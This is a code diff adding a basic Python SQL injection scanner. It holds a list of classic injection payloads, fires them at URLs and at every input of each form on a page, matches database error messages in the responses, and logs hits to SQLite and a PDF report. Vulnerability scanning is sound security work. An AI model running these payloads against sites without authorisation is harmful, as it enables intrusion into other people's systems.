@@ -1,0 +1,101 @@
+import requests
+from bs4 import BeautifulSoup
+import sqlite3
+from reportlab.pdfgen import canvas
+
+
+
+sql_payloads = [
+    "'", "\"", "OR 1=1 --", "OR '1'='1'", "' OR '1'='1' --",
+    "' OR '1'='1' #", "' OR 1=1 --", "1' OR '1'='1' --", "' OR 'a'='a' --"
+]
+
+error_signatures = [
+    "SQL syntax", "mysql_fetch", "ORA-00933", "Unclosed quotation",
+    "You have an error in your SQL syntax", "Warning: mysql_",
+    "Fatal error", "SQLSTATE[42000]"
+]
+
+
+import requests
+
+def test_sql_injection(url):
+    print(f"🔍 Testing {url} for SQL Injection vulnerabilities...")
+
+    for payload in sql_payloads:
+        test_url = f"{url}{payload}"  # Inject payload into the URL
+        try:
+            response = requests.get(test_url, timeout=5)  # Send request
+            response_text = response.text.lower()  # Convert response to lowercase for easy matching
+            
+            if any(error in response_text for error in error_signatures):
+                print(f"⚠️ SQL Injection vulnerability found at {test_url}")
+                return True  # Stop after finding vulnerability
+        except requests.exceptions.RequestException:
+            print(f"❌ Error testing {test_url}")
+            continue  # Skip to the next payload
+
+    print("✅ No SQL Injection vulnerability found.")
+    return False
+
+
+def extract_forms(url):
+    try:
+        response = requests.get(url)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        return soup.find_all("form")  # Return all form elements
+    except requests.exceptions.RequestException:
+        return []
+    
+
+def test_forms_for_sql_injection(url):
+    forms = extract_forms(url)
+    if not forms:
+        print("❌ No forms found on the page.")
+        return
+    
+    for form in forms:
+        action = form.attrs.get("action", "")
+        full_url = url + action
+        method = form.attrs.get("method", "get").lower()
+
+        form_inputs = {input_tag.get("name"): "' OR '1'='1" for input_tag in form.find_all("input") if input_tag.get("name")}
+
+        print(f"🔍 Testing form at {full_url}...")
+
+        if method == "post":
+            response = requests.post(full_url, data=form_inputs)
+        else:
+            response = requests.get(full_url, params=form_inputs)
+
+        response_text = response.text.lower()
+        if any(error in response_text for error in error_signatures):
+            print(f"⚠️ SQL Injection vulnerability found in form at {full_url}")
+            return True
+
+    print("✅ No SQL Injection vulnerability found in forms.")
+    return False
+
+
+conn = sqlite3.connect('scanner.db')
+cursor = conn.cursor()
+cursor.execute("CREATE TABLE IF NOT EXISTS scan_results (id INTEGER PRIMARY KEY, url TEXT, vulnerability TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)")
+conn.commit()
+
+def store_sql_vulnerability(url, details):
+    cursor.execute("INSERT INTO scan_results (url, vulnerability) VALUES (?, ?)", (url, details))
+    conn.commit()
+    print(f"✅ Stored SQL Injection vulnerability for {url}")
+
+
+def generate_sql_report(url, vulnerabilities):
+    c = canvas.Canvas(f"sql_report_{url.replace('https://', '').replace('/', '_')}.pdf")
+    c.drawString(100, 800, f"SQL Injection Report for {url}")
+
+    y = 750
+    for vuln in vulnerabilities:
+        c.drawString(100, y, f"Vulnerability: {vuln}")
+        y -= 30
+
+    c.save()
+    print("✅ Report generated.")
